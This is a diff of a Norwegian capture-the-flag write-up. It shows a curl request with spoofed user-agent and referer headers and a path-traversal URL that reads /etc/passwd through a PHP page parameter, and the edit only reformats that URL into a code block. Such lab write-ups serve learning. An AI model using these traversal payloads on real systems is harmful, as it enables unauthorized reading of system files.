@@ -51,4 +51,6 @@ curl -A "61c08546b939" -e "https://www.nsa.gov/" http://129.241.200.165:19680/in
 # Flag06
 Endre page, ved å gå til root og så inn i directory etc og vidre inn i passwd.
 Hentet opp deller av flagget når en går bakover i fil systemet og det siste ligger i etc/passwd
-`http://129.241.200.165:19680/index.php?page=../../../../../../../etc/passwd`
+```
+http://129.241.200.165:19680/index.php?page=../../../../../../../etc/passwd
+```
